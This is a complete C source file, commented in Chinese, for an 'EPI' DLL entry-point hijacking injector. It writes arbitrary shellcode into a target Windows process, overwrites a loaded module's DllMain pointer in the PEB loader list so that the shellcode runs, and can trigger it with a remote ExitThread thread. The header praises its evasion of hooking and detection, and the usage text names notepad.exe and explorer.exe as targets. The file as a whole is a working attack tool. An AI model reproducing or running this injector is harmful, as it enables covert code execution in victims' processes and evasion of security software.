/*
 * EPI (Entry Point Injection) - DLL 入口点劫持注入
 *
 * 原理：
 *   劫持目标进程中已加载 DLL 的入口点（DllMain），使其指向注入的 shellcode。
 *   当新线程被创建或现有线程退出时，所有已加载模块的入口点都会被调用，
 *   包括我们劫持的入口点，从而执行注入的 shellcode。
 *
 * 核心技术：
 *   1. 读取目标进程 PEB（Process Environment Block）
 *   2. 遍历 PEB_LDR_DATA 中的已加载模块双向链表
 *   3. 找到目标 DLL（如 kernelbase.dll）的 LDR_DATA_TABLE_ENTRY
 *   4. 分配内存并写入 shellcode
 *   5. 修改 LDR_DATA_TABLE_ENTRY.EntryPoint 指向 shellcode
 *   6. 等待新线程创建或线程退出时自动触发
 *
 * 优势：
 *   - Threadless 或 Threaded 执行可选
 *   - 不需要 Hooking（无 JMP/CALL 指令）
 *   - 不在 DLL 的 RX 内存创建私有内存区域
 *   - 不需要 RWX 内存权限
 *   - 目标进程可以继续正常执行
 *   - 新线程的起始地址不指向我们的 shellcode
 *
 * 参考：https://github.com/Kudaes/EPI
 * 作者：Kudaes
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <tlhelp32.h>

// 扩展的 LDR_DATA_TABLE_ENTRY 结构
typedef struct _LDR_DATA_TABLE_ENTRY_EXT {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;                // DLL 入口点（DllMain）
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    // ... 其他字段省略
} LDR_DATA_TABLE_ENTRY_EXT, *PLDR_DATA_TABLE_ENTRY_EXT;

// 扩展的 PEB_LDR_DATA 结构
typedef struct _PEB_LDR_DATA_EXT {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA_EXT, *PPEB_LDR_DATA_EXT;

// NtQueryInformationProcess 函数指针
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

/*
 * 读取目标进程的 PEB 地址
 */
PVOID GetRemotePEB(HANDLE hProcess) {
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[!] 无法获取 ntdll.dll 句柄\n");
        return NULL;
    }

    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");

    if (!NtQueryInformationProcess) {
        printf("[!] 无法获取 NtQueryInformationProcess 地址\n");
        return NULL;
    }

    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    if (status != 0) {
        printf("[!] NtQueryInformationProcess 失败（状态码：0x%lX）\n", status);
        return NULL;
    }

    printf("[+] 目标进程 PEB 地址：0x%p\n", pbi.PebBaseAddress);
    return pbi.PebBaseAddress;
}

/*
 * 查找目标 DLL 的 LDR_DATA_TABLE_ENTRY 并劫持入口点
 */
BOOL HijackDllEntryPoint(HANDLE hProcess, const wchar_t* targetDllName, PVOID shellcodeAddr) {
    // 1. 获取远程 PEB 地址
    PVOID remotePebAddr = GetRemotePEB(hProcess);
    if (!remotePebAddr) {
        return FALSE;
    }

    // 2. 读取远程 PEB
    PEB remotePeb;
    SIZE_T bytesRead;
    if (!ReadProcessMemory(hProcess, remotePebAddr, &remotePeb, sizeof(PEB), &bytesRead) ||
        bytesRead != sizeof(PEB)) {
        printf("[!] 读取远程 PEB 失败（错误码：%lu）\n", GetLastError());
        return FALSE;
    }

    printf("[+] PEB_LDR_DATA 地址：0x%p\n", remotePeb.Ldr);

    // 3. 读取 PEB_LDR_DATA
    PEB_LDR_DATA_EXT ldrData;
    if (!ReadProcessMemory(hProcess, remotePeb.Ldr, &ldrData, sizeof(PEB_LDR_DATA_EXT), &bytesRead) ||
        bytesRead != sizeof(PEB_LDR_DATA_EXT)) {
        printf("[!] 读取 PEB_LDR_DATA 失败（错误码：%lu）\n", GetLastError());
        return FALSE;
    }

    printf("[+] 已加载模块链表地址：0x%p\n", ldrData.InLoadOrderModuleList.Flink);

    // 4. 遍历已加载模块链表
    PLIST_ENTRY currentEntry = ldrData.InLoadOrderModuleList.Flink;
    PLIST_ENTRY firstEntry = currentEntry;
    BOOL found = FALSE;

    printf("\n[*] 遍历已加载模块链表...\n");

    do {
        // 读取 LDR_DATA_TABLE_ENTRY
        LDR_DATA_TABLE_ENTRY_EXT entry;
        PLDR_DATA_TABLE_ENTRY_EXT remoteEntryAddr = CONTAINING_RECORD(
            currentEntry,
            LDR_DATA_TABLE_ENTRY_EXT,
            InLoadOrderLinks
        );

        if (!ReadProcessMemory(hProcess, remoteEntryAddr, &entry, sizeof(entry), &bytesRead) ||
            bytesRead != sizeof(entry)) {
            printf("[!] 读取 LDR_DATA_TABLE_ENTRY 失败\n");
            break;
        }

        // 读取 DLL 名称
        if (entry.BaseDllName.Length > 0 && entry.BaseDllName.Length < 512) {
            wchar_t dllName[256] = {0};
            if (ReadProcessMemory(hProcess, entry.BaseDllName.Buffer, dllName,
                                entry.BaseDllName.Length, &bytesRead)) {
                dllName[entry.BaseDllName.Length / sizeof(wchar_t)] = L'\0';

                printf("    [*] DLL: %-30ls (Base: 0x%p, EntryPoint: 0x%p)\n",
                       dllName, entry.DllBase, entry.EntryPoint);

                // 检查是否是目标 DLL（不区分大小写）
                if (_wcsicmp(dllName, targetDllName) == 0) {
                    printf("\n[+] 找到目标 DLL：%ls\n", dllName);
                    printf("    [*] DllBase：0x%p\n", entry.DllBase);
                    printf("    [*] 原始 EntryPoint：0x%p\n", entry.EntryPoint);
                    printf("    [*] 新 EntryPoint（Shellcode）：0x%p\n", shellcodeAddr);

                    // 5. 修改 EntryPoint 字段
                    PVOID newEntryPoint = shellcodeAddr;
                    PVOID entryPointFieldAddr = (PVOID)((ULONG_PTR)remoteEntryAddr +
                                                        FIELD_OFFSET(LDR_DATA_TABLE_ENTRY_EXT, EntryPoint));

                    SIZE_T bytesWritten;
                    if (!WriteProcessMemory(hProcess, entryPointFieldAddr, &newEntryPoint,
                                          sizeof(PVOID), &bytesWritten) ||
                        bytesWritten != sizeof(PVOID)) {
                        printf("[!] 修改 EntryPoint 失败（错误码：%lu）\n", GetLastError());
                        return FALSE;
                    }

                    printf("[+] EntryPoint 已成功劫持！\n");
                    found = TRUE;
                    break;
                }
            }
        }

        // 移动到下一个条目
        currentEntry = entry.InLoadOrderLinks.Flink;

    } while (currentEntry != firstEntry && currentEntry != NULL);

    if (!found) {
        printf("[!] 未找到目标 DLL：%ls\n", targetDllName);
        return FALSE;
    }

    return TRUE;
}

/*
 * 强制创建线程触发 shellcode 执行
 * 创建一个调用 ExitThread 的线程，该线程退出前会调用所有 DLL 的入口点
 */
BOOL ForceTrigger(HANDLE hProcess) {
    printf("\n[*] 强制触发 shellcode 执行...\n");

    // ExitThread 的地址（在 kernel32.dll 中）
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        printf("[!] 无法获取 kernel32.dll 句柄\n");
        return FALSE;
    }

    LPTHREAD_START_ROUTINE pExitThread = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "ExitThread");
    if (!pExitThread) {
        printf("[!] 无法获取 ExitThread 地址\n");
        return FALSE;
    }

    printf("[+] ExitThread 地址：0x%p\n", pExitThread);

    // 创建远程线程，起始例程为 ExitThread
    // 这个线程会立即退出，退出前会调用所有 DLL 的入口点（包括我们劫持的）
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        pExitThread,
        NULL,
        0,
        NULL
    );

    if (hThread == NULL) {
        printf("[!] CreateRemoteThread 失败（错误码：%lu）\n", GetLastError());
        return FALSE;
    }

    printf("[+] 已创建远程线程（句柄：0x%p）\n", hThread);
    printf("[*] 线程将调用 ExitThread 并触发 DLL 入口点\n");

    CloseHandle(hThread);
    return TRUE;
}

/*
 * 读取 shellcode 文件
 */
BOOL ReadShellcodeFile(const char* path, BYTE** outBuffer, SIZE_T* outSize) {
    HANDLE hFile = CreateFileA(
        path,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] 无法打开文件：%s（错误码：%lu）\n", path, GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("[!] 无法获取文件大小（错误码：%lu）\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    *outBuffer = (BYTE*)malloc(fileSize);
    if (*outBuffer == NULL) {
        printf("[!] 内存分配失败\n");
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, *outBuffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("[!] 读取文件失败（错误码：%lu）\n", GetLastError());
        free(*outBuffer);
        CloseHandle(hFile);
        return FALSE;
    }

    *outSize = fileSize;
    CloseHandle(hFile);
    return TRUE;
}

/*
 * 执行 EPI 注入
 */
BOOL InjectEPI(DWORD targetPID, const wchar_t* targetDllName, BYTE* shellcode, SIZE_T shellcodeSize, BOOL forceTrigger) {
    printf("\n======================================\n");
    printf("  EPI - DLL 入口点劫持注入\n");
    printf("======================================\n\n");

    // 1. 打开目标进程
    printf("[1] 打开目标进程\n");
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE |
        PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD,
        FALSE,
        targetPID
    );

    if (hProcess == NULL) {
        printf("[!] 无法打开进程 PID=%lu（错误码：%lu）\n", targetPID, GetLastError());
        return FALSE;
    }

    printf("    [+] 成功打开进程 PID=%lu\n", targetPID);

    // 2. 分配内存并写入 shellcode
    printf("\n[2] 分配内存并写入 Shellcode\n");
    PVOID remoteShellcode = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READ
    );

    if (remoteShellcode == NULL) {
        printf("[!] 内存分配失败（错误码：%lu）\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("    [+] 已分配内存：0x%p（大小：%zu 字节）\n", remoteShellcode, shellcodeSize);

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteShellcode, shellcode, shellcodeSize, &bytesWritten) ||
        bytesWritten != shellcodeSize) {
        printf("[!] 写入 shellcode 失败（错误码：%lu）\n", GetLastError());
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("    [+] Shellcode 已写入（%zu 字节）\n", bytesWritten);

    // 3. 劫持 DLL 入口点
    printf("\n[3] 劫持 DLL 入口点\n");
    printf("    [*] 目标 DLL：%ls\n\n", targetDllName);

    if (!HijackDllEntryPoint(hProcess, targetDllName, remoteShellcode)) {
        printf("[!] 劫持失败\n");
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // 4. 触发执行
    if (forceTrigger) {
        if (!ForceTrigger(hProcess)) {
            printf("[!] 强制触发失败\n");
        }
    } else {
        printf("\n[*] 等待新线程创建或线程退出时自动触发...\n");
        printf("[*] 提示：在目标进程中执行操作（如打开文件、点击按钮）来创建新线程\n");
    }

    printf("\n[+] EPI 注入成功！\n");
    printf("[!] 注意：请勿关闭目标进程，否则 shellcode 将无法执行\n\n");

    CloseHandle(hProcess);
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("用法：%s <PID> <Shellcode文件> [选项]\n\n", argv[0]);
        printf("参数说明：\n");
        printf("  PID             - 目标进程 ID\n");
        printf("  Shellcode文件   - Shellcode 文件路径\n\n");
        printf("选项：\n");
        printf("  -f              - 强制触发（创建线程调用 ExitThread）\n");
        printf("  -d <DLL名称>    - 指定目标 DLL（默认：kernelbase.dll）\n\n");
        printf("示例：\n");
        printf("  %s 1234 payload.bin\n", argv[0]);
        printf("  %s 1234 payload.bin -f\n", argv[0]);
        printf("  %s 1234 payload.bin -d kernel32.dll -f\n\n", argv[0]);
        printf("推荐目标进程：\n");
        printf("  - notepad.exe（记事本）\n");
        printf("  - explorer.exe（资源管理器）\n");
        printf("  - 任何有用户交互的 GUI 程序\n\n");
        printf("提示：\n");
        printf("  - 选择经常创建/销毁线程的进程以快速触发\n");
        printf("  - 在目标进程中执行操作（打开文件、点击按钮）来创建新线程\n");
        printf("  - 使用 -f 选项可立即触发，但会创建一个远程线程\n\n");
        return 1;
    }

    DWORD targetPID = atoi(argv[1]);
    const char* shellcodePath = argv[2];

    // 解析选项
    BOOL forceTrigger = FALSE;
    wchar_t targetDllName[256] = L"kernelbase.dll";  // 默认目标 DLL

    for (int i = 3; i < argc; i++) {
        if (strcmp(argv[i], "-f") == 0) {
            forceTrigger = TRUE;
        } else if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
            MultiByteToWideChar(CP_ACP, 0, argv[i + 1], -1, targetDllName, 256);
            i++;
        }
    }

    // 加载 shellcode
    BYTE* shellcode;
    SIZE_T shellcodeSize;

    printf("[*] 正在加载 shellcode：%s\n", shellcodePath);
    if (!ReadShellcodeFile(shellcodePath, &shellcode, &shellcodeSize)) {
        return 1;
    }
    printf("[+] Shellcode 已加载（%zu 字节）\n", shellcodeSize);

    // 执行注入
    BOOL success = InjectEPI(targetPID, targetDllName, shellcode, shellcodeSize, forceTrigger);

    free(shellcode);
    return success ? 0 : 1;
}
